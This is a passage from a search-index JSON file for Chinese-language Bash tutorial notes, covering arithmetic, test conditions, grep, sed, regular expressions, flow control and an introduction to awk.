\u4ec5\u5220\u9664\u53d8\u91cf","title":"Bash\u53d8\u91cf"},{"location":"week02/Bash\u57fa\u672c\u8fd0\u7b97/","text":"Bash\u57fa\u672c\u8fd0\u7b97 \u56db\u5219\u8fd0\u7b97\u7b26\uff1a shell\u5185\u7f6e\u4f7f\u7528\u7684\u8fd0\u7b97\u65b9\u5f0f expr \u53ea\u80fd\u505a\u6574\u6570\u4e4b\u95f4\u7684\u8fd0\u7b97\uff0c\u7ed3\u679c\u4e5f\u662f\u6574\u6570\u3002 \u6ce8\u610f\uff1a\u8fd0\u7b97\u7b26\u4e24\u8fb9\u8981\u6709\u7a7a\u683c\uff0c * \u9700\u8f6c\u4e49 $ expr 2 + 2 $ expr 3 \\* -2 $ expr 9 / 2 $ expr 5 % 2 \u903b\u8f91\u8fd0\u7b97\u7b26\uff1a & \uff1a \u67090\u53d60\uff0c\u65e00\u53d6\u524d\u8005 | \uff1a \u82e5\u5168\u4e3a0\u53d60\uff0c\u5426\u5219\u53d6\u7b2c\u4e00\u4e2a\u4e0d\u4e3a0\u7684 && \uff1a \u524d\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u6210\u529f\u624d\u6267\u884c\u540e\u4e00\u4e2a\u547d\u4ee4 || \uff1a \u524d\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u5931\u8d25\u624d\u6267\u884c\u540e\u4e00\u4e2a\u547d\u4ee4 $ expr 0 \\& 1 $ expr 0 \\| 1 \u5173\u7cfb\u8fd0\u7b97\u7b26\uff1a\u6210\u7acb\u8fd4\u56de1\uff0c\u4e0d\u6210\u7acb\u8fd4\u56de0\uff0c < \u548c > \u9700\u8f6c\u4e49 $ expr 1 \\< 2 $ expr 1 \\>= 2 $[ ] \u7b80\u5355\u7b97\u672f\u8fd0\u7b97\uff0c\u5df2\u8fc7\u65f6 (( )) \u7b80\u5355\u7b97\u672f\u8fd0\u7b97\uff0c\u91cc\u9762\u7684\u53d8\u91cf\u4e0d\u9700\u8981\u4f7f\u7528 $ $ echo $((1+1)) $ a=0 $ ((a+=3)) $ echo $a let \u8fdb\u884c\u7b80\u5355\u7b97\u672f\u8fd0\u7b97\u5e76\u8d4b\u503c $ let a=1+3 $ echo a declare \u547d\u4ee4\u53ef\u4ee5\u58f0\u660e\u53d8\u91cf\u7684\u7c7b\u578b\uff1a -i \u58f0\u660e\u4e3a\u6574\u6570 +i \u58f0\u660e\u4e0d\u4e3a\u6574\u6570 $ declare - i a $ a+=3 $ echo $a bc \u547d\u4ee4\u53ef\u4ee5\u8ba1\u7b97\u6d6e\u70b9\u6570\uff1a $ echo \"3+3\" | bc # scale \u7528\u4e8e\u63a7\u5236\u663e\u793a\u7cbe\u5ea6 $ echo \"scale=2;1.1*3.3\" | bc \u6761\u4ef6\u5224\u65ad\uff1a test \u8868\u8fbe\u5f0f \u6216 [ \u8868\u8fbe\u5f0f ] \uff0c \u4e8c\u8005\u7b49\u4ef7\u3002 \u5224\u65ad\u5927\u4e8e\uff0c\u5c0f\u4e8e\uff0c\u7b49\u4e8e\uff1a -gt , -lt , -eq \u5224\u65ad\u8def\u5f84\u662f\u5426\u4e3a\u76ee\u5f55\uff0c\u662f\u5426\u5b58\u5728\uff0c\u662f\u5426\u53ef\u8bfb\uff1a -d , -e , -r \u548c\uff0c\u6216\uff1a -a , -o $ test 3 -gt 2 # \u9700\u8981\u901a\u8fc7$?\u67e5\u770b\u8fd4\u56de\u503c\uff0c\u4e3a\u771f\u65f6\u8fd4\u56de0\uff0c\u4e3a\u5047\u65f6\u8fd4\u56de1 $ echo $? # \u6ce8\u610f[ ]\u4e0e\u8868\u8fbe\u5f0f\u4e4b\u95f4\u8981\u6709\u7a7a\u683c $ [ 3 -eq 4 ] $ [ -d /home ] $ [ -e /home -o -r /home ] [[ \u8868\u8fbe\u5f0f ]] \u7c7b\u4f3c\u4e8e [ \u8868\u8fbe\u5f0f ] \uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u6bd4\u8f83\u8fd0\u7b97\u7b26\uff08\u6bd4\u8f83\u7684\u662f\u5b57\u7b26\u4e32\uff01\uff09\u548c\u903b\u8f91\u8fd0\u7b97\u7b26\uff08\u4e0d\u652f\u6301 -a \u548c -o \uff09\uff0c\u8fd8\u652f\u6301 ~= \uff08\u5339\u914d\u6b63\u5219\u8868\u8fbe\u5f0f\uff09\u3002 bash\u4e2d[]\u4e0e[[]]\u7684\u533a\u522b > shell\u4e2d'-gt'\u4e0e'>'\u7684\u533a\u522b \u8fdb\u5236\u8f6c\u6362\uff1a # \u4f7f\u7528bc\u505a\u8fdb\u5236\u8f6c\u6362\uff0c\u628aibase\u8fdb\u5236\u8f6c\u4e3aobase\u8fdb\u5236 $ echo \"obase=2;ibase=10;11\" | bc # \u5c06\u4e8c\u8fdb\u5236\u8f6c\u4e3a\u5341\u8fdb\u5236 $ echo $((2#1011)) \u6ce8\u610f\uff1a\u4f7f\u7528 bc \u8fdb\u884c\u8fdb\u5236\u8f6c\u6362\u65f6\uff0c\u6700\u597d\u5148\u8bbe\u7f6eobase\uff0c\u518d\u8bbe\u7f6eibase\u3002\u56e0\u4e3a\uff0c\u5f53\u8bbe\u7f6eibase\u540e\uff0c\u8f93\u5165bc\u7684\u6240\u6709\u6570\u5b57\u90fd\u4f7f\u7528\u8be5\u8fdb\u5236\uff0c\u5305\u62ec\u7528\u4e8e\u8bbe\u7f6eobase\u7684\u6570\u5b57\u3002 $ echo \"obase=10;ibase=2;1100\" | bc 12 $ echo \"ibase=2;obase=10;1100\" | bc 1100 \u968f\u673a\u6570\uff1a $RANDOM \u4ea7\u751f0\\~32767\u7684\u968f\u673a\u6570 shuf \u547d\u4ee4\uff1a -i \u6307\u5b9a\u968f\u673a\u6570\u8303\u56f4\uff0c -n \u6307\u5b9a\u751f\u6210\u968f\u673a\u6570\u4e2a\u6570","title":"Bash \u57fa\u672c\u8fd0\u7b97"},{"location":"week02/Bash\u57fa\u672c\u8fd0\u7b97/#bash","text":"\u56db\u5219\u8fd0\u7b97\u7b26\uff1a shell\u5185\u7f6e\u4f7f\u7528\u7684\u8fd0\u7b97\u65b9\u5f0f expr \u53ea\u80fd\u505a\u6574\u6570\u4e4b\u95f4\u7684\u8fd0\u7b97\uff0c\u7ed3\u679c\u4e5f\u662f\u6574\u6570\u3002 \u6ce8\u610f\uff1a\u8fd0\u7b97\u7b26\u4e24\u8fb9\u8981\u6709\u7a7a\u683c\uff0c * \u9700\u8f6c\u4e49 $ expr 2 + 2 $ expr 3 \\* -2 $ expr 9 / 2 $ expr 5 % 2 \u903b\u8f91\u8fd0\u7b97\u7b26\uff1a & \uff1a \u67090\u53d60\uff0c\u65e00\u53d6\u524d\u8005 | \uff1a \u82e5\u5168\u4e3a0\u53d60\uff0c\u5426\u5219\u53d6\u7b2c\u4e00\u4e2a\u4e0d\u4e3a0\u7684 && \uff1a \u524d\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u6210\u529f\u624d\u6267\u884c\u540e\u4e00\u4e2a\u547d\u4ee4 || \uff1a \u524d\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u5931\u8d25\u624d\u6267\u884c\u540e\u4e00\u4e2a\u547d\u4ee4 $ expr 0 \\& 1 $ expr 0 \\| 1 \u5173\u7cfb\u8fd0\u7b97\u7b26\uff1a\u6210\u7acb\u8fd4\u56de1\uff0c\u4e0d\u6210\u7acb\u8fd4\u56de0\uff0c < \u548c > \u9700\u8f6c\u4e49 $ expr 1 \\< 2 $ expr 1 \\>= 2 $[ ] \u7b80\u5355\u7b97\u672f\u8fd0\u7b97\uff0c\u5df2\u8fc7\u65f6 (( )) \u7b80\u5355\u7b97\u672f\u8fd0\u7b97\uff0c\u91cc\u9762\u7684\u53d8\u91cf\u4e0d\u9700\u8981\u4f7f\u7528 $ $ echo $((1+1)) $ a=0 $ ((a+=3)) $ echo $a let \u8fdb\u884c\u7b80\u5355\u7b97\u672f\u8fd0\u7b97\u5e76\u8d4b\u503c $ let a=1+3 $ echo a declare \u547d\u4ee4\u53ef\u4ee5\u58f0\u660e\u53d8\u91cf\u7684\u7c7b\u578b\uff1a -i \u58f0\u660e\u4e3a\u6574\u6570 +i \u58f0\u660e\u4e0d\u4e3a\u6574\u6570 $ declare - i a $ a+=3 $ echo $a bc \u547d\u4ee4\u53ef\u4ee5\u8ba1\u7b97\u6d6e\u70b9\u6570\uff1a $ echo \"3+3\" | bc # scale \u7528\u4e8e\u63a7\u5236\u663e\u793a\u7cbe\u5ea6 $ echo \"scale=2;1.1*3.3\" | bc \u6761\u4ef6\u5224\u65ad\uff1a test \u8868\u8fbe\u5f0f \u6216 [ \u8868\u8fbe\u5f0f ] \uff0c \u4e8c\u8005\u7b49\u4ef7\u3002 \u5224\u65ad\u5927\u4e8e\uff0c\u5c0f\u4e8e\uff0c\u7b49\u4e8e\uff1a -gt , -lt , -eq \u5224\u65ad\u8def\u5f84\u662f\u5426\u4e3a\u76ee\u5f55\uff0c\u662f\u5426\u5b58\u5728\uff0c\u662f\u5426\u53ef\u8bfb\uff1a -d , -e , -r \u548c\uff0c\u6216\uff1a -a , -o $ test 3 -gt 2 # \u9700\u8981\u901a\u8fc7$?\u67e5\u770b\u8fd4\u56de\u503c\uff0c\u4e3a\u771f\u65f6\u8fd4\u56de0\uff0c\u4e3a\u5047\u65f6\u8fd4\u56de1 $ echo $? # \u6ce8\u610f[ ]\u4e0e\u8868\u8fbe\u5f0f\u4e4b\u95f4\u8981\u6709\u7a7a\u683c $ [ 3 -eq 4 ] $ [ -d /home ] $ [ -e /home -o -r /home ] [[ \u8868\u8fbe\u5f0f ]] \u7c7b\u4f3c\u4e8e [ \u8868\u8fbe\u5f0f ] \uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u6bd4\u8f83\u8fd0\u7b97\u7b26\uff08\u6bd4\u8f83\u7684\u662f\u5b57\u7b26\u4e32\uff01\uff09\u548c\u903b\u8f91\u8fd0\u7b97\u7b26\uff08\u4e0d\u652f\u6301 -a \u548c -o \uff09\uff0c\u8fd8\u652f\u6301 ~= \uff08\u5339\u914d\u6b63\u5219\u8868\u8fbe\u5f0f\uff09\u3002 bash\u4e2d[]\u4e0e[[]]\u7684\u533a\u522b","title":"Bash\u57fa\u672c\u8fd0\u7b97"},{"location":"week02/Bash\u57fa\u672c\u8fd0\u7b97/#shell-gt","text":"\u8fdb\u5236\u8f6c\u6362\uff1a # \u4f7f\u7528bc\u505a\u8fdb\u5236\u8f6c\u6362\uff0c\u628aibase\u8fdb\u5236\u8f6c\u4e3aobase\u8fdb\u5236 $ echo \"obase=2;ibase=10;11\" | bc # \u5c06\u4e8c\u8fdb\u5236\u8f6c\u4e3a\u5341\u8fdb\u5236 $ echo $((2#1011)) \u6ce8\u610f\uff1a\u4f7f\u7528 bc \u8fdb\u884c\u8fdb\u5236\u8f6c\u6362\u65f6\uff0c\u6700\u597d\u5148\u8bbe\u7f6eobase\uff0c\u518d\u8bbe\u7f6eibase\u3002\u56e0\u4e3a\uff0c\u5f53\u8bbe\u7f6eibase\u540e\uff0c\u8f93\u5165bc\u7684\u6240\u6709\u6570\u5b57\u90fd\u4f7f\u7528\u8be5\u8fdb\u5236\uff0c\u5305\u62ec\u7528\u4e8e\u8bbe\u7f6eobase\u7684\u6570\u5b57\u3002 $ echo \"obase=10;ibase=2;1100\" | bc 12 $ echo \"ibase=2;obase=10;1100\" | bc 1100 \u968f\u673a\u6570\uff1a $RANDOM \u4ea7\u751f0\\~32767\u7684\u968f\u673a\u6570 shuf \u547d\u4ee4\uff1a -i \u6307\u5b9a\u968f\u673a\u6570\u8303\u56f4\uff0c -n \u6307\u5b9a\u751f\u6210\u968f\u673a\u6570\u4e2a\u6570","title":"&gt; shell\u4e2d'-gt'\u4e0e'&gt;'\u7684\u533a\u522b"},{"location":"week02/Bash\u6b63\u5219\u8868\u8fbe\u5f0f/","text":"Bash\u6b63\u5219\u8868\u8fbe\u5f0f grep\u8bed\u6cd5\uff1a grep [\u53c2\u6570] \u6a21\u5f0f [\u6587\u4ef6] -c \u53ea\u6253\u5370\u5339\u914d\u7684\u884c\u6570 -i \u5ffd\u7565\u5927\u5c0f\u5199 -n \u8f93\u51fa\u7684\u540c\u65f6\u6253\u5370\u884c\u53f7 -v \u53cd\u9009\uff0c\u8f93\u51fa\u4e0d\u5339\u914d\u7684\u884c\u7684\u5185\u5bb9 -r \u9012\u5f52\u5339\u914d\u67e5\u627e -R \u9012\u5f52\u5339\u914d\u67e5\u627e\uff0c\u4f46\u4f1a\u904d\u5386\u6240\u6709\u7b26\u53f7\u94fe\u63a5 -A n \u9664\u4e86\u5217\u51fa\u5339\u914d\u884c\u4e4b\u5916\uff0c\u8fd8\u5217\u51fa\u540e\u9762n\u884c -B n \u9664\u4e86\u5217\u51fa\u5339\u914d\u884c\u4e4b\u5916\uff0c\u8fd8\u5217\u51fa\u524d\u9762n\u884c grep\u652f\u6301\u4e09\u79cd\u6b63\u5219\u8868\u8fbe\u5f0f\u5f15\u64ce\uff1a -G POSIX\u57fa\u672c\u6b63\u5219\u8868\u8fbe\u5f0f\uff0cBRE\uff08\u9ed8\u8ba4\uff09 -E POSIX\u6269\u5c55\u6b63\u5219\u8868\u8fbe\u5f0f\uff0cERE -P Perl\u6b63\u5219\u8868\u8fbe\u5f0f\uff0cPCRE \u8bed\u6cd5\u652f\u6301\uff1a \\d , \\D BRE\u548cERE\u5747\u4e0d\u652f\u6301 + , ? , {n} , {n, m} BRE\u4e0d\u652f\u6301\uff0cERE\u652f\u6301 | , () BRE\u4e0d\u652f\u6301\uff0cERE\u652f\u6301 (?P<NAME>) BRE\u548cERE\u5747\u4e0d\u652f\u6301 ? BRE\u548cERE\u5747\u4e0d\u652f\u6301\u975e\u8d2a\u5a6a\u5339\u914d \u6b63\u5219\u8868\u8fbe\u5f0f\uff1a . \u4efb\u610f\u5b57\u7b26 \\ \u8f6c\u4e49\u7b26 [...] \u6307\u5b9a\u7684\u5b57\u7b26 [^...] \u4e0d\u662f\u6307\u5b9a\u7684\u5b57\u7b26 \\d , \\D \u6570\u5b57\uff0c\u975e\u6570\u5b57 \\w , \\W \u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf\uff0c\u975e\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf \\s , \\S \u7a7a\u767d\uff0c\u975e\u7a7a\u767d {n} \u51fa\u73b0n\u6b21 {n,} , {,n} \u81f3\u5c11n\u6b21\uff0c\u81f3\u591an\u6b21 {n,m} n\u81f3m\u6b21 * , + , ? 0+\u6b21\uff0c1+\u6b21\uff0c\u4e00\u6b21\u6216\u96f6\u6b21 ^ , $ \u5f00\u59cb\uff0c \u7ed3\u675f \\b , \\B \u5355\u8bcd\u8fb9\u754c\uff0c\u975e\u5355\u8bcd\u8fb9\u754c | \u6216 () , (?P<NAME>) \u5b50\u8868\u8fbe\u5f0f\uff0c\u5206\u7ec4 \u5176\u5b83\u7b26\u53f7\uff08BRE\u548cERE\u5747\u652f\u6301\uff09\uff1a \u7b26\u53f7 \u8bf4\u660e [:alnum:] [0-9a-zA-Z] [:alpha:] [a-zA-Z] [:lower:] [a-z] [:upper:] [A-Z] [:digit:] [0-9] [:blank:] \u7a7a\u767d\u5b57\u7b26\u548c\u5236\u8868\u7b26\uff0c\u5373 [ \\t] [:cntrl:] ASCII<32\u6216127\u3002\u63a7\u5236\u952e [:graph:] \u53ef\u6253\u5370\u5b57\u7b26\uff0c\u4e5f\u5c31\u662f\u6570\u5b57\u5b57\u6bcd\u548c\u6807\u70b9\u7b26\u53f7 [:print:] \u53ef\u8f93\u51fa\u5b57\u7b26\uff0c\u4e5f\u5c31\u662f\u9664\u4e86\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u8fd8\u5305\u62ec\u7a7a\u767d\u5b57\u7b26 [:punct:] \u6807\u70b9\u7b26\u53f7 [:space:] \u7a7a\u767d\u5b57\u7b26 [:xdigit:] \u8868\u793a16\u8fdb\u5236\u7684\u6570\u5b57\uff0c\u5373 [0-9a-fA-F] sed\uff1a -n \u5b89\u9759\u6a21\u5f0f\uff0c\u53ea\u6253\u5370\u53d7\u5f71\u54cd\u7684\u884c\uff0c\u9ed8\u8ba4\u6253\u5370\u5168\u90e8\u5185\u5bb9 -e \u6dfb\u52a0\u6267\u884c\u547d\u4ee4\u4e00\u6b21\u6267\u884c -f \u6587\u4ef6\u540d \u6307\u5b9a\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u547d\u4ee4 -r \u4f7f\u7528\u6269\u5c55\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u9ed8\u8ba4\u4e3a\u6807\u51c6\u6b63\u5219\u8868\u8fbe\u5f0f -i \u5c06\u76f4\u63a5\u4fee\u6539\u8f93\u5165\u6587\u4ef6\u5185\u5bb9\uff0c\u800c\u4e0d\u662f\u6253\u5370\u5230\u6807\u51c6\u8f93\u51fa\u8bbe\u5907 \u884c\u53f7\u9009\u62e9\uff1a n \u7b2cn\u884c n,m \u4ece\u7b2cn\u884c\u5230\u7b2cm\u884c n~m \u4ece\u7b2cn\u5f00\u59cb\u4ee5m\u4e3a\u6b65\u8fdb\u7684\u6240\u6709\u884c $ \u6700\u540e\u4e00\u884c \u547d\u4ee4 \u8bf4\u660e s \u884c\u5185\u66ff\u6362 c \u6574\u884c\u66ff\u6362 a \u63d2\u5165\u5230\u6307\u5b9a\u884c\u7684\u540e\u9762 i \u63d2\u5165\u5230\u6307\u5b9a\u884c\u7684\u524d\u9762 p \u6253\u5370\uff0c\u901a\u5e38\u4e0e -n \u53c2\u6570\u914d\u5408\u4f7f\u7528 d \u5220\u9664\u6307\u5b9a\u884c y \u5bf9\u5e94\u5b57\u7b26\u66ff\u6362","title":"Bash \u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"week02/Bash\u6b63\u5219\u8868\u8fbe\u5f0f/#bash","text":"grep\u8bed\u6cd5\uff1a grep [\u53c2\u6570] \u6a21\u5f0f [\u6587\u4ef6] -c \u53ea\u6253\u5370\u5339\u914d\u7684\u884c\u6570 -i \u5ffd\u7565\u5927\u5c0f\u5199 -n \u8f93\u51fa\u7684\u540c\u65f6\u6253\u5370\u884c\u53f7 -v \u53cd\u9009\uff0c\u8f93\u51fa\u4e0d\u5339\u914d\u7684\u884c\u7684\u5185\u5bb9 -r \u9012\u5f52\u5339\u914d\u67e5\u627e -R \u9012\u5f52\u5339\u914d\u67e5\u627e\uff0c\u4f46\u4f1a\u904d\u5386\u6240\u6709\u7b26\u53f7\u94fe\u63a5 -A n \u9664\u4e86\u5217\u51fa\u5339\u914d\u884c\u4e4b\u5916\uff0c\u8fd8\u5217\u51fa\u540e\u9762n\u884c -B n \u9664\u4e86\u5217\u51fa\u5339\u914d\u884c\u4e4b\u5916\uff0c\u8fd8\u5217\u51fa\u524d\u9762n\u884c grep\u652f\u6301\u4e09\u79cd\u6b63\u5219\u8868\u8fbe\u5f0f\u5f15\u64ce\uff1a -G POSIX\u57fa\u672c\u6b63\u5219\u8868\u8fbe\u5f0f\uff0cBRE\uff08\u9ed8\u8ba4\uff09 -E POSIX\u6269\u5c55\u6b63\u5219\u8868\u8fbe\u5f0f\uff0cERE -P Perl\u6b63\u5219\u8868\u8fbe\u5f0f\uff0cPCRE \u8bed\u6cd5\u652f\u6301\uff1a \\d , \\D BRE\u548cERE\u5747\u4e0d\u652f\u6301 + , ? , {n} , {n, m} BRE\u4e0d\u652f\u6301\uff0cERE\u652f\u6301 | , () BRE\u4e0d\u652f\u6301\uff0cERE\u652f\u6301 (?P<NAME>) BRE\u548cERE\u5747\u4e0d\u652f\u6301 ? BRE\u548cERE\u5747\u4e0d\u652f\u6301\u975e\u8d2a\u5a6a\u5339\u914d \u6b63\u5219\u8868\u8fbe\u5f0f\uff1a . \u4efb\u610f\u5b57\u7b26 \\ \u8f6c\u4e49\u7b26 [...] \u6307\u5b9a\u7684\u5b57\u7b26 [^...] \u4e0d\u662f\u6307\u5b9a\u7684\u5b57\u7b26 \\d , \\D \u6570\u5b57\uff0c\u975e\u6570\u5b57 \\w , \\W \u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf\uff0c\u975e\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf \\s , \\S \u7a7a\u767d\uff0c\u975e\u7a7a\u767d {n} \u51fa\u73b0n\u6b21 {n,} , {,n} \u81f3\u5c11n\u6b21\uff0c\u81f3\u591an\u6b21 {n,m} n\u81f3m\u6b21 * , + , ? 0+\u6b21\uff0c1+\u6b21\uff0c\u4e00\u6b21\u6216\u96f6\u6b21 ^ , $ \u5f00\u59cb\uff0c \u7ed3\u675f \\b , \\B \u5355\u8bcd\u8fb9\u754c\uff0c\u975e\u5355\u8bcd\u8fb9\u754c | \u6216 () , (?P<NAME>) \u5b50\u8868\u8fbe\u5f0f\uff0c\u5206\u7ec4 \u5176\u5b83\u7b26\u53f7\uff08BRE\u548cERE\u5747\u652f\u6301\uff09\uff1a \u7b26\u53f7 \u8bf4\u660e [:alnum:] [0-9a-zA-Z] [:alpha:] [a-zA-Z] [:lower:] [a-z] [:upper:] [A-Z] [:digit:] [0-9] [:blank:] \u7a7a\u767d\u5b57\u7b26\u548c\u5236\u8868\u7b26\uff0c\u5373 [ \\t] [:cntrl:] ASCII<32\u6216127\u3002\u63a7\u5236\u952e [:graph:] \u53ef\u6253\u5370\u5b57\u7b26\uff0c\u4e5f\u5c31\u662f\u6570\u5b57\u5b57\u6bcd\u548c\u6807\u70b9\u7b26\u53f7 [:print:] \u53ef\u8f93\u51fa\u5b57\u7b26\uff0c\u4e5f\u5c31\u662f\u9664\u4e86\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u8fd8\u5305\u62ec\u7a7a\u767d\u5b57\u7b26 [:punct:] \u6807\u70b9\u7b26\u53f7 [:space:] \u7a7a\u767d\u5b57\u7b26 [:xdigit:] \u8868\u793a16\u8fdb\u5236\u7684\u6570\u5b57\uff0c\u5373 [0-9a-fA-F] sed\uff1a -n \u5b89\u9759\u6a21\u5f0f\uff0c\u53ea\u6253\u5370\u53d7\u5f71\u54cd\u7684\u884c\uff0c\u9ed8\u8ba4\u6253\u5370\u5168\u90e8\u5185\u5bb9 -e \u6dfb\u52a0\u6267\u884c\u547d\u4ee4\u4e00\u6b21\u6267\u884c -f \u6587\u4ef6\u540d \u6307\u5b9a\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u547d\u4ee4 -r \u4f7f\u7528\u6269\u5c55\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u9ed8\u8ba4\u4e3a\u6807\u51c6\u6b63\u5219\u8868\u8fbe\u5f0f -i \u5c06\u76f4\u63a5\u4fee\u6539\u8f93\u5165\u6587\u4ef6\u5185\u5bb9\uff0c\u800c\u4e0d\u662f\u6253\u5370\u5230\u6807\u51c6\u8f93\u51fa\u8bbe\u5907 \u884c\u53f7\u9009\u62e9\uff1a n \u7b2cn\u884c n,m \u4ece\u7b2cn\u884c\u5230\u7b2cm\u884c n~m \u4ece\u7b2cn\u5f00\u59cb\u4ee5m\u4e3a\u6b65\u8fdb\u7684\u6240\u6709\u884c $ \u6700\u540e\u4e00\u884c \u547d\u4ee4 \u8bf4\u660e s \u884c\u5185\u66ff\u6362 c \u6574\u884c\u66ff\u6362 a \u63d2\u5165\u5230\u6307\u5b9a\u884c\u7684\u540e\u9762 i \u63d2\u5165\u5230\u6307\u5b9a\u884c\u7684\u524d\u9762 p \u6253\u5370\uff0c\u901a\u5e38\u4e0e -n \u53c2\u6570\u914d\u5408\u4f7f\u7528 d \u5220\u9664\u6307\u5b9a\u884c y \u5bf9\u5e94\u5b57\u7b26\u66ff\u6362","title":"Bash\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"week02/Bash\u6d41\u7a0b\u63a7\u5236/","text":"Bash\u6d41\u7a0b\u63a7\u5236 if\u8bed\u53e5\uff1a # \u5355\u5206\u652f if \u6761\u4ef6 ; then \u64cd\u4f5c fi # \u591a\u5206\u652f if \u6761\u4ef61 ; then \u64cd\u4f5c1 elif \u6761\u4ef62 ; then \u64cd\u4f5c2 else \u64cd\u4f5c3 fi case\u8bed\u53e5\uff1a # \u5355\u5206\u652f case \u503c in \u503c1|\u503c2|\u503c3) \u64cd\u4f5c esac # \u591a\u5206\u652f case \u503c in \u503c11|\u503c12|\u503c13) \u64cd\u4f5c1 ;; \u503c21|\u503c22|\u503c23) \u64cd\u4f5c2 ;; *) \u64cd\u4f5c esac for\u5faa\u73af\uff1a # \u5217\u8868for\u5faa\u73af for \u5faa\u73af\u53d8\u91cf in \u5217\u8868 do \u64cd\u4f5c done # \u4e0d\u5e26\u5217\u8868\u7684for\u5faa\u73af\uff08\u904d\u5386$@\uff09 for \u5faa\u73af\u53d8\u91cf do \u64cd\u4f5c done # C\u8bed\u8a00\u98ce\u683c\u7684for\u5faa\u73af for ((i=0;i<10;i++)) do \u64cd\u4f5c done while\u5faa\u73af\uff1a while \u6761\u4ef6 do \u64cd\u4f5c done until\u5faa\u73af\uff1a until \u6761\u4ef6 do \u64cd\u4f5c done select\uff1a select \u53d8\u91cf\u540d in \u83dc\u5355\u53d6\u503c\u5217\u8868 do \u64cd\u4f5c done \u9ed8\u8ba4\u63d0\u793a\u7b26\u4e3a #? \uff0c\u53ef\u4ee5\u901a\u8fc7 PS3 \u4fee\u6539 PS3=\"Please select: \" select lan in Java Python Javascript do echo $lan done break\uff1a break \u9000\u51fa\u5faa\u73af break n \u9000\u51fa\u7b2cn\u5c42\u5faa\u73af continue\uff1a\u8df3\u51fa\u672c\u6b21\u5faa\u73af","title":"Bash \u6d41\u7a0b\u63a7\u5236"},{"location":"week02/Bash\u6d41\u7a0b\u63a7\u5236/#bash","text":"if\u8bed\u53e5\uff1a # \u5355\u5206\u652f if \u6761\u4ef6 ; then \u64cd\u4f5c fi # \u591a\u5206\u652f if \u6761\u4ef61 ; then \u64cd\u4f5c1 elif \u6761\u4ef62 ; then \u64cd\u4f5c2 else \u64cd\u4f5c3 fi case\u8bed\u53e5\uff1a # \u5355\u5206\u652f case \u503c in \u503c1|\u503c2|\u503c3) \u64cd\u4f5c esac # \u591a\u5206\u652f case \u503c in \u503c11|\u503c12|\u503c13) \u64cd\u4f5c1 ;; \u503c21|\u503c22|\u503c23) \u64cd\u4f5c2 ;; *) \u64cd\u4f5c esac for\u5faa\u73af\uff1a # \u5217\u8868for\u5faa\u73af for \u5faa\u73af\u53d8\u91cf in \u5217\u8868 do \u64cd\u4f5c done # \u4e0d\u5e26\u5217\u8868\u7684for\u5faa\u73af\uff08\u904d\u5386$@\uff09 for \u5faa\u73af\u53d8\u91cf do \u64cd\u4f5c done # C\u8bed\u8a00\u98ce\u683c\u7684for\u5faa\u73af for ((i=0;i<10;i++)) do \u64cd\u4f5c done while\u5faa\u73af\uff1a while \u6761\u4ef6 do \u64cd\u4f5c done until\u5faa\u73af\uff1a until \u6761\u4ef6 do \u64cd\u4f5c done select\uff1a select \u53d8\u91cf\u540d in \u83dc\u5355\u53d6\u503c\u5217\u8868 do \u64cd\u4f5c done \u9ed8\u8ba4\u63d0\u793a\u7b26\u4e3a #? \uff0c\u53ef\u4ee5\u901a\u8fc7 PS3 \u4fee\u6539 PS3=\"Please select: \" select lan in Java Python Javascript do echo $lan done break\uff1a break \u9000\u51fa\u5faa\u73af break n \u9000\u51fa\u7b2cn\u5c42\u5faa\u73af continue\uff1a\u8df3\u51fa\u672c\u6b21\u5faa\u73af","title":"Bash\u6d41\u7a0b\u63a7\u5236"},{"location":"week02/awk\u5165\u95e8/","text":"awk\u5165\u95e8 awk\u6240\u6709\u7684\u64cd\u4f5c\u90fd\u662f\u57fa\u4e8e \u6a21\u5f0f-\u64cd\u4f5c \u5bf9\u6765\u5b8c\u6210\u7684\uff0c\u683c\u5f0f\uff1a \u6a21\u5f0f {\u64cd\u4f5c} \u5728awk\u4e2d\u7684\u6a21\u5f0f\u6709\uff1a \u6b63\u5219\u8868\u8fbe\u5f0f\u3002 ~ \uff1a\u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\uff0c !~ \u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f\u4e0d\u5339\u914d \u5173\u7cfb\u8868\u8fbe\u5f0f\u3002\u5173\u7cfb\u8fd0\u7b97\u7b26\uff1a < , <= , != , == \u7b49 \u7ec4\u5408\u7684\u6a21\u5f0f\u3002 || , && , ! \u6a21\u5f0f1,\u6a21\u5f0f2 \uff1a\u4ece\u5339\u914d\u6a21\u5f0f1\u5230\u5339\u914d\u6a21\u5f0f2\u4e4b\u95f4\u7684\u8bb0\u5f55 BEGIN\uff1a\u5728\u8bfb\u53d6\u8f93\u5165\u524d\u6267\u884c\u4e00\u6b21 END\uff1a\u5728\u8bfb\u53d6\u6240\u6709\u8f93\u5165\u540e\u6267\u884c awk\u9009\u9879\uff1a F \u6307\u5b9a\u5b57\u6bb5\u5206\u9694\u7b26\uff08\u9ed8\u8ba4\u4e3a\u7a7a\u683c\uff09 f \u8fd0\u884cawk\u811a\u672c v \u9884\u5148\u4e3aawk\u7a0b\u5e8f\u6307\u5b9a\u53d8\u91cf $ awk -F: '{print $1}' /etc/passwd $ echo | awk -v user=$USER '{print user}' awk\u5e38\u7528\u5185\u7f6e\u53d8\u91cf\uff1a \u53d8\u91cf\u540d \u8bf4\u660e FILENAME \u8f93\u5165\u6587\u4ef6\u540d $0 \u5f53\u524d\u8bb0\u5f55\u7684\u5185\u5bb9 NF \u5f53\u524d\u8bb0\u5f55\u5b57\u6bb5\u6570\uff08\u5217\u6570\uff09 $N 